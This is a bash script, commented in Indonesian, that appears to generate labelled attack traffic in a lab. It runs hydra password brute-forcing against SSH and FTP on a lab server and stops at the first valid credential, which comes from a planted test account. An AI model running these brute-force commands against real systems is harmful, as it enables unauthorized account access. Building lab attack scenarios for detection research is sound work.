#!/usr/bin/env bash
# S02 — SSH/FTP brute force (hydra). Kategori: Brute Force.
# Target: srv-file (SSH 22 + FTP 21), selalu nyala. Fase: mana saja.
SCN=S02; ATTACK_CAT="Brute Force"; PHASE=any
HERE="$(cd "$(dirname "$0")" && pwd)"; . "$HERE/../_lib/common.sh"
need_tool hydra
banner
ensure_up "$SRV_FILE"

# -f berhenti saat 1 kredensial valid ketemu (labadmin/labadmin ada di pass.txt
# -> menghasilkan sampel "berhasil" yang realistis), -t 4 paralel sedang.
mark_start "$SRV_FILE"
echo "== SSH brute =="
hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f -o "$HERE/s02-ssh.hydra" ssh://"$SRV_FILE" || true
settle 5
echo "== FTP brute =="
hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f -o "$HERE/s02-ftp.hydra" ftp://"$SRV_FILE" || true
mark_end "$SRV_FILE"
echo "Output: s02-ssh.hydra, s02-ftp.hydra"
